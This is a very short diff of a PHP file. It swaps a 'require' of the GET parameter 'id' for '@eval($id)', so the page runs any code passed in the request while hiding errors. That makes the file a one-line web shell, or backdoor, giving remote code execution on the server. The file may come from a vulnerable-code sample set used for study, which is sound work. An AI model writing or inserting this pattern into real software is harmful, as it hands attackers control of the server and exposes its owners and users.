@@ -1,8 +1,6 @@
-<?php 
+<?php
 
 $id = $_GET['id'] ;
-require $id;
-
-
+@eval($id) ;
 
 ?>
